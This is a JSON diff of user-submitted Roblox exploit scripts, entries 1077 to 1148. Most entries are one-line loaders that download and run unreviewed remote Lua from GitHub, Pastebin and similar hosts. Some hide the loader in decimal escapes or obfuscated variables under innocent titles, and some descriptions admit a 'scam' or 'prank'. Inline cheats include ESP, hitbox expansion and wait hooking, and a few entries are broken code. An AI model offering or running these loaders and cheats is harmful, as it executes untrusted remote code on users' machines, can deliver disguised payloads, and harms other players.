+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/ReQiuYTPL/hub/main/ReQiuYTPLHub.lua'),true))()",
+      "Script_Title": "adopt me",
+      "User_ID": 2862946743,
+      "Username": "123_jenya"
+    },
+    "Script1077": {
+      "Date": "November 07 2024",
+      "Description": "just a normal fly script",
+      "Script": "loadstring(\"\\108\\111\\97\\100\\115\\116\\114\\105\\110\\103\\40\\103\\97\\109\\101\\58\\72\\116\\116\\112\\71\\101\\116\\40\\40\\39\\104\\116\\116\\112\\115\\58\\47\\47\\103\\105\\115\\116\\46\\103\\105\\116\\104\\117\\98\\117\\115\\101\\114\\99\\111\\110\\116\\101\\110\\116\\46\\99\\111\\109\\47\\109\\101\\111\\122\\111\\110\\101\\89\\84\\47\\98\\102\\48\\51\\55\\100\\102\\102\\57\\102\\48\\97\\55\\48\\48\\49\\55\\51\\48\\52\\100\\100\\100\\54\\55\\102\\100\\99\\100\\51\\55\\48\\47\\114\\97\\119\\47\\101\\49\\52\\101\\55\\52\\102\\52\\50\\53\\98\\48\\54\\48\\100\\102\\53\\50\\51\\51\\52\\51\\99\\102\\51\\48\\98\\55\\56\\55\\48\\55\\52\\101\\98\\51\\99\\53\\100\\50\\47\\97\\114\\99\\101\\117\\115\\37\\50\\53\\50\\48\\120\\37\\50\\53\\50\\48\\102\\108\\121\\37\\50\\53\\50\\48\\50\\37\\50\\53\\50\\48\\111\\98\\102\\108\\117\\99\\97\\116\\111\\114\\39\\41\\44\\116\\114\\117\\101\\41\\41\\40\\41\\10\\10\")()\n",
+      "Script_Title": "fly script",
+      "User_ID": 7025877845,
+      "Username": "Poopyjooby1"
+    },
+    "Script1078": {
+      "Date": "November 07 2024",
+      "Description": "just a normal infinite yield script",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()",
+      "Script_Title": "infinite yield",
+      "User_ID": 7025877845,
+      "Username": "Poopyjooby1"
+    },
+    "Script1079": {
+      "Date": "November 07 2024",
+      "Description": "auto farm",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/londnee/code/refs/heads/main/Fisch.lua\"))()",
+      "Script_Title": "fish op",
+      "User_ID": 2748048267,
+      "Username": "mamadisimus13"
+    },
+    "Script1080": {
+      "Date": "November 08 2024",
+      "Description": "follow me for more",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/ScpGuest666/Random-Roblox-script/main/Roblox%20animation%20speed%20script'))()",
+      "Script_Title": "stop&fast animation ",
+      "User_ID": 4327645854,
+      "Username": "misteryferson"
+    },
+    "Script1081": {
+      "Date": "November 08 2024",
+      "Description": "4",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "4",
+      "User_ID": 7049633607,
+      "Username": "darknesseednness"
+    },
+    "Script1082": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()\n",
+      "Script_Title": "Brookhaven ",
+      "User_ID": 7552587133,
+      "Username": "Mrs_Kashiganda"
+    },
+    "Script1083": {
+      "Date": "November 08 2024",
+      "Description": "another ghost hub",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "ghost hub",
+      "User_ID": 4736471230,
+      "Username": "Bella_lunch"
+    },
+    "Script1084": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Vcsk/AstralHub/main/Main.lua\", true))()",
+      "Script_Title": "astral",
+      "User_ID": 7546310020,
+      "Username": "elbanana404"
+    },
+    "Script1085": {
+      "Date": "November 08 2024",
+      "Description": "I didn't make this and for the chosen one",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Chosen-One-laziest-V2-7696\"))()",
+      "Script_Title": "Laziest Sricpt ",
+      "User_ID": 7375752572,
+      "Username": "I_amnoone19"
+    },
+    "Script1086": {
+      "Date": "November 08 2024",
+      "Description": "King hub Evade",
+      "Script": "loadstring(game:HttpGet(\"https://scriptblox.com/raw/UPDATE-Evade-Evade-5359\"))()",
+      "Script_Title": "King hub Evade scrip",
+      "User_ID": 7398087242,
+      "Username": "eatlime135"
+    },
+    "Script1087": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "ghost hub",
+      "User_ID": 7179940456,
+      "Username": "HTTPSBATTEL"
+    },
+    "Script1088": {
+      "Date": "November 08 2024",
+      "Description": "idk",
+      "Script": "-------------------------------------------kill Function()-----------------------------------------Health = 0 --------------------------------humanoidrootpart:Destroy--------------------------------------------------------------------------------------s:Button(\"Bring All \",function()-----------------------------------------Humanoidrooptart:Destroy-------------------------------------------bring Function-------------------------------------------161159912477910063:load-------------------------------------------End)---------------------------------------s:Button(\"Kill all \",function()-----------------------------------------player.Health = 0 -------------------------------------------end) ---------------------------------------------------------------------------------b:Button(\"fling All \",function()-----------------------------------------infiniteyield.txt-------------------------------------------fling All = on -------------------------------------------end)\n\n\n\n\n\n\n",
+      "Script_Title": "idk",
+      "User_ID": 4698935219,
+      "Username": "Allenkoshy1241"
+    },
+    "Script1089": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "--[[\n_________                       _____            ___________________\n__  ____/__________________________(_)_______    ___  ____/__  ____/\n_  / __ _  _ \\_  __ \\  _ \\_  ___/_  /__  ___/    __  /_   __  __/   \n/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   \n\\____/  \\___//_/ /_/\\___//____/ /_/  /____/      /_/      /_____/                               \n\nby rqz                    \nhttps://discord.com/invite/aEZpBEHgMT\n]]--\n\n--====================================--\n--           FDless Options           --\n--====================================--\n\nallowshiftlock = true --adds shiftlock to patchma rig\nctrltp = true --adds control click tp\nplaceholders = true --adds transparent parts showing your hats when you don't have real ones\nclickfling = false --adds click flinging regardless of attacks\nhighlightflingtargets = true --highlight fling\ndischarscripts = true --disable character scripts\nflingchangestate = true --fling with whole body\nrespawntp = 3 --respawn tp mode\n-- 0 - stay at spawn\n-- 1 - randomtp close\n-- 2 - behind fake character\n-- 3 - hide body\nbreakjointsmethod = 1 --breakjoints mode\n-- 1 - health+breakjoints (the most support)\n-- 2 - health or breakjoints\n-- 3 - breakjoints\nsimrad = true --sets simulation radius\n\n--==========================================================================================================================--\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Goner\"))()\n\n--==========================================================================================================================--",
+      "Script_Title": "Genesis",
+      "User_ID": 5646992520,
+      "Username": "NAH_idprefer"
+    },
+    "Script1090": {
+      "Date": "November 08 2024",
+      "Description": "Reality river",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/EnzoLeo127/Scripts/main/GoogleAwesomeWorld\"))()",
+      "Script_Title": "BeInternetAwesomwrld",
+      "User_ID": 4965401347,
+      "Username": "asnifah190"
+    },
+    "Script1091": {
+      "Date": "November 08 2024",
+      "Description": "loadstring(game:HttpGet(('https://pastebin.com/raw/d26A6cAk'),true))()",
+      "Script": "loadstring(game:HttpGet(('https://pastebin.com/raw/d26A6cAk'),true))()",
+      "Script_Title": "loadstring(game:Http",
+      "User_ID": 7498649099,
+      "Username": "Gartu776"
+    },
+    "Script1092": {
+      "Date": "November 08 2024",
+      "Description": "gojo ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Strongest-Battlegrounds-Gojo-tsb-script-WORKS-ON-SOLARA-18641\"))()",
+      "Script_Title": "gojo tsb script",
+      "User_ID": 3536136100,
+      "Username": "solotumorro23"
+    },
+    "Script1093": {
+      "Date": "November 08 2024",
+      "Description": "good for farm",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Survive-the-Killer!-ChairWare-6982\"))()",
+      "Script_Title": " stk chairware hub",
+      "User_ID": 3536136100,
+      "Username": "solotumorro23"
+    },
+    "Script1094": {
+      "Date": "November 08 2024",
+      "Description": "only work for brookhaven",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Free-Script-16614\"))()",
+      "Script_Title": "free bundle avatar",
+      "User_ID": 3536136100,
+      "Username": "solotumorro23"
+    },
+    "Script1095": {
+      "Date": "November 08 2024",
+      "Description": "blade ball",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "blade bal",
+      "User_ID": 7555770551,
+      "Username": "gustorinkita_70"
+    },
+    "Script1096": {
+      "Date": "November 08 2024",
+      "Description": "im not joking",
+      "Script": "if game.CreatorType == Enum.CreatorType.User then\ngame.Players.LocalPlayer.UserId = game.CreatorId\nend\nif game.CreatorType == Enum.CreatorType.Group then\ngame.Players.LocalPlayer.UserId = game:GetService(\"GroupService\"):GetGroupInfoAsync(game.CreatorId).Owner.Id\nend",
+      "Script_Title": "be da owner",
+      "User_ID": 4058381943,
+      "Username": "qfrdhguk"
+    },
+    "Script1097": {
+      "Date": "November 08 2024",
+      "Description": "btw this a slap battle script",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Slap-Battles-Unlock-All-Badges-11643\"))()",
+      "Script_Title": "slap my [REDACTED]",
+      "User_ID": 4058381943,
+      "Username": "qfrdhguk"
+    },
+    "Script1098": {
+      "Date": "November 08 2024",
+      "Description": "cool fly gui",
+      "Script": "loadstring(game:HttpGet(\"https://github.com/l0ckerV5/RobIox-Exploits/raw/refs/heads/main/Protected_2354134114061323.txt\"))()",
+      "Script_Title": "L-FLY",
+      "User_ID": 7398087242,
+      "Username": "eatlime135"
+    },
+    "Script1099": {
+      "Date": "November 08 2024",
+      "Description": "jimm",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/brosula123/CAMLOCK/main/SKIBIDI\"))()",
+      "Script_Title": "camlock ",
+      "User_ID": 3922544671,
+      "Username": "bruh96897"
+    },
+    "Script1100": {
+      "Date": "November 08 2024",
+      "Description": "Free and best",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Strongest-Battlegrounds-FREE-AND-BEST-GUI-15593\"))()",
+      "Script_Title": "The strongest battle",
+      "User_ID": 5305181397,
+      "Username": "HI_everyone807"
+    },
+    "Script1101": {
+      "Date": "November 08 2024",
+      "Description": "adopt me scam",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/iwantsom3/script/main/V3xadoAdoptMeHubV.2\"))()",
+      "Script_Title": "adopt me",
+      "User_ID": 2349276121,
+      "Username": "bffgghhfPro"
+    },
+    "Script1102": {
+      "Date": "November 08 2024",
+      "Description": "bedwars",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/7GrandDadPGN/VapeV4ForRoblox/main/NewMainScript.lua\", true))()",
+      "Script_Title": "bedwars vape",
+      "User_ID": 4044413376,
+      "Username": "rjbojfd"
+    },
+    "Script1103": {
+      "Date": "November 08 2024",
+      "Description": "Custom items GUI for doors",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Darli17/DOORS-REBOUNCES/refs/heads/main/main-ig\"))()",
+      "Script_Title": "Doors Custom Items",
+      "User_ID": 7302153955,
+      "Username": "brazil_brazil76"
+    },
+    "Script1104": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ChopLoris/ArcHub/main/main.lua\"))()",
+      "Script_Title": "king legacy 👍👍",
+      "User_ID": 1861551340,
+      "Username": "minelox463"
+    },
+    "Script1105": {
+      "Date": "November 08 2024",
+      "Description": "Makes you nerdy🤓🤓",
+      "Script": "local Player = game.Players.LocalPlayer\nlocal Character = Player.Character\nlocal Head = Character:FindFirstChild(\"Head\")",
+      "Script_Title": "Big Head",
+      "User_ID": 3806871401,
+      "Username": "rrttggjjpp"
+    },
+    "Script1106": {
+      "Date": "November 08 2024",
+      "Description": "Hay",
+      "Script": "loadstring(permainan:HttpGet('https://pastebin.com/raw/HAgidzUN'))();",
+      "Script_Title": "Icha1101Hub",
+      "User_ID": 4768887125,
+      "Username": "Roh_bxv"
+    },
+    "Script1107": {
+      "Date": "November 08 2024",
+      "Description": "https://rekonise.com/pls-donate-hub-skl6f",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/DarkHub_193\"))()",
+      "Script_Title": "DakHub",
+      "User_ID": 4768887125,
+      "Username": "Roh_bxv"
+    },
+    "Script1108": {
+      "Date": "November 08 2024",
+      "Description": "https://raw.githubusercontent.com/StormZt/PlsDonate/refs/heads/main/RebornV",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Fly-Gui-Script-21183\"))()",
+      "Script_Title": "8KMIN",
+      "User_ID": 4768887125,
+      "Username": "Roh_bxv"
+    },
+    "Script1109": {
+      "Date": "November 08 2024",
+      "Description": "cool script by:ghost player",
+      "Script": "loadstring(game:HttpGet('https://pastefy.app/S7xNJSXX/raw'))()execute(\"Script19\")",
+      "Script_Title": "Save Emotes Gui",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script1110": {
+      "Date": "November 08 2024",
+      "Description": "Best Script Hub OP",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/SabrXH/Draught-Hub-V5/refs/heads/main/Script.lua\"))()",
+      "Script_Title": "Draught Hub v5",
+      "User_ID": 4393082564,
+      "Username": "emilcarevskiy96"
+    },
+    "Script1111": {
+      "Date": "November 08 2024",
+      "Description": "IM NOT JOKING \"When you run this script it will hang a little bit\"",
+      "Script": "if \"you wanna use rochips universal\" then\n\tlocal z_x,z_z=\"gzrux646yj/raw/main.ts\",\"https://glot.io/snippets/\"\n\tlocal im,lonely,z_c=task.wait,game,loadstring\n\tz_c(lonely:HttpGet(z_z..\"\"..z_x))()\n\treturn (\"This will load in about 2 - 30 seconds\" or \"according to your device and executor\")\nend\n\n",
+      "Script_Title": "BAN SCRIPT*FE* ☠",
+      "User_ID": 204511701,
+      "Username": "ARTMAN_06"
+    },
+    "Script1112": {
+      "Date": "November 08 2024",
+      "Description": "I KNOW UR SHOCKED BC IM OWNER \"Brooke Haven\" but i was hack for fun ",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": "DON'T CLICK ON ME !",
+      "User_ID": 60596019,
+      "Username": "D7_OxL"
+    },
+    "Script1113": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ToraScript/Script/main/WrestlingLegends\"))()",
+      "Script_Title": "reset",
+      "User_ID": 1986984954,
+      "Username": "Mishaleshatar"
+    },
+    "Script1114": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ToraScript/Script/main/WrestlingLegends\"))()",
+      "Script_Title": "wrestling legends",
+      "User_ID": 1986984954,
+      "Username": "Mishaleshatar"
+    },
+    "Script1115": {
+      "Date": "November 09 2024",
+      "Description": "Working in starving artist only pixel art",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/itsnoctural/Utilities/main/Closed/StarvingArtist.lua\"))()",
+      "Script_Title": "Auto Draw",
+      "User_ID": 3545025457,
+      "Username": "accvodanh13"
+    },
+    "Script1116": {
+      "Date": "November 08 2024",
+      "Description": "Execute in doors",
+      "Script": "loadstring(game:HttpGet(\"https:.//raw.githubusercontent.com/notpoiu/Scripts/refs/heads/main/StarJug.lua\"))()",
+      "Script_Title": "doors barrel",
+      "User_ID": 692147090,
+      "Username": "XDFUOPD"
+    },
+    "Script1117": {
+      "Date": "November 09 2024",
+      "Description": "key_statue3 CH_hzklq4ma",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/toosiwhip/statue/main/dustytrip.lua'))()",
+      "Script_Title": "dusty trip keys down",
+      "User_ID": 4766698521,
+      "Username": "uuuuhhhhidonknow"
+    },
+    "Script1118": {
+      "Date": "November 08 2024",
+      "Description": "dont my script:)",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Augustzyzx/A-s-t-r-a-l/main/Fixed_BB_Parry-obfuscated.lua'))()",
+      "Script_Title": "github blade ball",
+      "User_ID": 4806752125,
+      "Username": "clavik_BOOM"
+    },
+    "Script1119": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/GhostHub'))()",
+      "Script_Title": ".",
+      "User_ID": 7532792611,
+      "Username": "M2929009"
+    },
+    "Script1120": {
+      "Date": "November 08 2024",
+      "Description": "nocooldown in some games ",
+      "Script": "g = hookfunction(wait, function(seconds)\nreturn g(0)\nend)",
+      "Script_Title": "nocd",
+      "User_ID": 4432873864,
+      "Username": "Paquitadosinferno"
+    },
+    "Script1121": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/RScriptz/RobloxScripts/main/BreakIn2.lua\"))()",
+      "Script_Title": "Break In 2",
+      "User_ID": 1961161111,
+      "Username": "Samuelribeiro_17"
+    },
+    "Script1122": {
+      "Date": "November 08 2024",
+      "Description": "Auto farm, quests, buy, misc, auto race v2, auto race v4.",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999\"))()",
+      "Script_Title": "Redz hub Blox fruits",
+      "User_ID": 2664604713,
+      "Username": "lefty_023"
+    },
+    "Script1123": {
+      "Date": "November 08 2024",
+      "Description": "SCRIPT ESP ALL (PT BR 🇧🇷 )",
+      "Script": "local espEnabled = true  -- Estado inicial do ESP (ativado)\nlocal updateInterval = 3 -- Tempo em segundos para atualização regular do ESP\n\n-- Função para criar a ESP\nlocal function createESP(player)\n    -- Evita criar ESP para o próprio jogador\n    if player == game.Players.LocalPlayer then return end\n\n    -- Checa se já existe ESP no jogador\n    if player.Character and player.Character:FindFirstChild(\"Head\") and not player.Character.Head:FindFirstChild(\"ESPBox\") then\n        local billboard = Instance.new(\"BillboardGui\", player.Character.Head)\n        billboard.Name = \"ESPBox\"\n        billboard.Size = UDim2.new(2, 0, 2, 0)\n        billboard.AlwaysOnTop = true\n        \n        local frame = Instance.new(\"Frame\", billboard)\n        frame.Size = UDim2.new(1, 0, 1, 0)\n        frame.BackgroundTransparency = 0.5\n        frame.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Cor do ESP (vermelho)\n    end\nend\n\n-- Função para atualizar o ESP\nlocal function updateESP()\n    for _, player in pairs(game.Players:GetPlayers()) do\n        createESP(player)\n    end\nend\n\n-- Função para limpar o ESP quando desativado\nlocal function clearESP()\n    for _, player in pairs(game.Players:GetPlayers()) do\n        if player.Character and player.Character:FindFirstChild(\"Head\") then\n            local espBox = player.Character.Head:FindFirstChild(\"ESPBox\")\n            if espBox then\n                espBox:Destroy()\n            end\n        end\n    end\nend\n\n-- Criar o botão na tela\nlocal screenGui = Instance.new(\"ScreenGui\", game.CoreGui)\nlocal button = Instance.new(\"TextButton\", screenGui)\nbutton.Size = UDim2.new(0, 100, 0, 50) -- Tamanho do botão\nbutton.Position = UDim2.new(0, 10, 0, 10) -- Posição no canto superior esquerdo\nbutton.Text = \"Desativar ESP\" -- Texto inicial\nbutton.BackgroundColor3 = Color3.fromRGB(0, 0, 255) -- Cor do botão (azul)\nbutton.TextColor3 = Color3.fromRGB(255, 255, 255) -- Cor do texto (branco)\nbutton.Font = Enum.Font.SourceSans\nbutton.TextSize = 16\n\n-- Função para alternar o estado do ESP e atualizar instantaneamente\nlocal function toggleESP()\n    espEnabled = not espEnabled\n    if espEnabled then\n        button.Text = \"Desativar ESP\"\n        button.BackgroundColor3 = Color3.fromRGB(0, 0, 255) -- Azul para ativado\n        updateESP() -- Atualiza imediatamente ao ativar\n    else\n        button.Text = \"Ativar ESP\"\n        button.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Vermelho para desativado\n        clearESP() -- Limpa imediatamente ao desativar\n    end\nend\n\n-- Conecta o botão ao clique\nbutton.MouseButton1Click:Connect(toggleESP)\n\n-- Atualização do ESP a cada 3 segundos (atualização regular)\nspawn(function()\n    while true do\n        if espEnabled then\n            updateESP()\n        end\n        wait(updateInterval)\n    end\nend)",
+      "Script_Title": "Hx Text🇧🇷 esp ",
+      "User_ID": 7408087081,
+      "Username": "kit_cynALT"
+    },
+    "Script1124": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "require(7192763922).load(\"WOKINPOLAND2\")",
+      "Script_Title": "Admin HD 1812",
+      "User_ID": 7324500019,
+      "Username": "WOKINPOLAND2"
+    },
+    "Script1125": {
+      "Date": "November 08 2024",
+      "Description": "No",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-new-rochips-emote-animation-universal-19440\"))()",
+      "Script_Title": "No",
+      "User_ID": 4693188573,
+      "Username": "snuisinuosousujuos"
+    },
+    "Script1126": {
+      "Date": "November 08 2024",
+      "Description": "script TOP OP",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/NoTwistedHere/Roblox/main/AntiAFK.lua\"))()",
+      "Script_Title": "SCRIPT TOP",
+      "User_ID": 5656534701,
+      "Username": "rUnrJXaTTLr"
+    },
+    "Script1127": {
+      "Date": "November 08 2024",
+      "Description": "(HI) ",
+      "Script": "local InfiniteJumpEnabled = true\ngame:GetService(\"UserInputService\").JumpRequest:connect(function()\n\tif InfiniteJumpEnabled then\n\t\tgame:GetService\"Players\".LocalPlayer.Character:FindFirstChildOfClass'Humanoid':ChangeState(\"Jumping\")\n\tend\nend)\n\nlocal vu = game:GetService(\"VirtualUser\")\ngame:GetService(\"Players\").LocalPlayer.Idled:connect(function()\n    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)\n    wait(1)\n    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)\nend)\n \ngame.StarterGui:SetCore(\"SendNotification\", {\n    Title = \"Subscribe To JN HH Gaming\";\n    Text = \"Made by JN HH Gaming\"; -- what the text says (ofc)\n    Duration = 60;\n})\nwait(1)\ngame.StarterGui:SetCore(\"SendNotification\", {\n    Title = \"Have Fun Killing\";\n    Text = \"Enjoy\"; -- what the text says (ofc)\n    Duration = 60;\n})\n_G.HeadSize = 20\n_G.Disabled = true\n\ngame:GetService('RunService').RenderStepped:connect(function()\nif _G.Disabled then\nfor i,v in next, game:GetService('Players'):GetPlayers() do\nif v.Name ~= game:GetService('Players').LocalPlayer.Name then\npcall(function()\nv.Character.HumanoidRootPart.Size = Vector3.new(_G.HeadSize,_G.HeadSize,_G.HeadSize)\nv.Character.HumanoidRootPart.Transparency = 0.7\nv.Character.HumanoidRootPart.BrickColor = BrickColor.new(\"Really black\")\nv.Character.HumanoidRootPart.Material = \"Neon\"\nv.Character.HumanoidRootPart.CanCollide = false\nend)\nend\nend\nend\nend)",
+      "Script_Title": "ninja parkour",
+      "User_ID": 1385009113,
+      "Username": "dyjose1"
+    },
+    "Script1128": {
+      "Date": "November 08 2024",
+      "Description": "nothing",
+      "Script": "loadstring(game:HttpGet(('https://pastebin.com/raw/Q4n7x0YB'), true))()",
+      "Script_Title": "BAN UI",
+      "User_ID": 1826533,
+      "Username": "dyjose1"
+    },
+    "Script1129": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Hug-Gui-R6-17818\"))()",
+      "Script_Title": "hug",
+      "User_ID": 7546310020,
+      "Username": "elbanana404"
+    },
+    "Script1130": {
+      "Date": "November 09 2024",
+      "Description": "Hiii",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-QuirkyCMD-FE-admin-8667\"))()\n",
+      "Script_Title": "kick",
+      "User_ID": 3682538737,
+      "Username": "SAD_BERAT01"
+    },
+    "Script1131": {
+      "Date": "November 08 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Brick-Admin-BETA-12105\"))()",
+      "Script_Title": "Brick Admin",
+      "User_ID": 3007602869,
+      "Username": "zezin_4k"
+    },
+    "Script1132": {
+      "Date": "November 09 2024",
+      "Description": "goodluck for farm",
+      "Script": "iloadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999\"))()",
+      "Script_Title": "blox fruit no key",
+      "User_ID": 3101266219,
+      "Username": "THEROBLOX1214XD"
+    },
+    "Script1133": {
+      "Date": "November 08 2024",
+      "Description": "LOOOOL you got pranked",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ChopLoris/ArcHub/main/main.lua\"))()",
+      "Script_Title": "car of hell",
+      "User_ID": 7339187766,
+      "Username": "cuentacompartida668"
+    },
+    "Script1134": {
+      "Date": "November 08 2024",
+      "Description": "makes you invincible ",
+      "Script": "loadstring(game:HttpGet(\"https://pastebin.com/raw/FwfNEqYz\", true))()\n",
+      "Script_Title": "Invincible ",
+      "User_ID": 4557454406,
+      "Username": "Tbhdevii"
+    },
+    "Script1135": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/IceMael7/NewIceHub/main/Brookhaven\"))()",
+      "Script_Title": "ice hub ",
+      "User_ID": 4005558907,
+      "Username": "devil6070yt"
+    },
+    "Script1136": {
+      "Date": "November 09 2024",
+      "Description": "use this to get anything like gamepass rubox and others",
+      "Script": "local __function = loadstring(game:HttpGet(\"https://github.com/Hosvile/DEX-Explorer/releases/latest/download/main.lua\", true))\n \n__function(__function)",
+      "Script_Title": "dex explorer",
+      "User_ID": 5824227378,
+      "Username": "mysecondacc130"
+    },
+    "Script1137": {
+      "Date": "November 09 2024",
+      "Description": "This script Has over 100+ game scripts and universal hacks!",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/scripthubekitten/SCRIPTHUBV3/main/SCRIPTHUBV3\", true))()",
+      "Script_Title": "Script Hub",
+      "User_ID": 7535975241,
+      "Username": "holylama01"
+    },
+    "Script1138": {
+      "Date": "November 09 2024",
+      "Description": "GHUB V14",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-GHub-21892\"))()",
+      "Script_Title": "Ghub BROOKHAVEN",
+      "User_ID": 2052618775,
+      "Username": "noahkulet5"
+    },
+    "Script1139": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/zakater5/LuaRepo/main/YBA/v3.lua\"))()",
+      "Script_Title": "yba",
+      "User_ID": 4044413376,
+      "Username": "rjbojfd"
+    },
+    "Script1140": {
+      "Date": "November 09 2024",
+      "Description": "This is a moveset of a a-train script to go fast and annoy players from tsb",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/yzeedw/Mortalv2-main/main/A%20train/Moveset\"))()",
+      "Script_Title": "Tsb a-train moveset",
+      "User_ID": 7558367624,
+      "Username": "testmm2hk"
+    },
+    "Script1141": {
+      "Date": "November 09 2024",
+      "Description": "super op",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/zephyr10101/ignore-touchinterests/main/main\",true))()",
+      "Script_Title": "op godmode",
+      "User_ID": 7396122314,
+      "Username": "cafofop_0"
+    },
+    "Script1142": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Valxic-Hub-Universal-Alpha-Testing-21782\"))()",
+      "Script_Title": "valxic",
+      "User_ID": 7546310020,
+      "Username": "elbanana404"
+    },
+    "Script1143": {
+      "Date": "November 09 2024",
+      "Description": "available games on this discord: https://discord.gg/aG6KdRje3x",
+      "Script": "--games on this discord: https://discord.gg/aG6KdRje3x\n\nloadstring(game:HttpGet(\"https://gist.github.com/someunknowndude/38cecea5be9d75cb743eac8b1eaf6758/raw\"))()",
+      "Script_Title": "QUIRKYCMD",
+      "User_ID": 3218635454,
+      "Username": "free_voice"
+    },
+    "Script1144": {
+      "Date": "November 09 2024",
+      "Description": "blox fruit ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999\"))()",
+      "Script_Title": "REDZ script ",
+      "User_ID": 5757592664,
+      "Username": "hec_ker168"
+    },
+    "Script1145": {
+      "Date": "November 09 2024",
+      "Description": "wrestling",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ToraScript/Script/main/WrestlingLegends\"))()",
+      "Script_Title": "wrestling mod",
+      "User_ID": 5268882225,
+      "Username": "Acer_29677"
+    },
+    "Script1146": {
+      "Date": "November 09 2024",
+      "Description": "Free To Use",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Dress-To-Impress-DTI-GUI-FREE-VIP-AUFARM-TROLLING-AND-MORE-WORKS-ON-SOLARA-20703\"))()",
+      "Script_Title": "DTI",
+      "User_ID": 3518215722,
+      "Username": "markJohncelestino11"
+    },
+    "Script1147": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "\n\n",
+      "Script_Title": "coolgu",
+      "User_ID": 4402772883,
+      "Username": "izzan_cooly"
+    },
+    "Script1148": {
+      "Date": "November 09 2024",
+      "Description": "",
+      "Script": "require(15581949972).mc(\"paAmfong\")",
+      "Script_Title": "s",
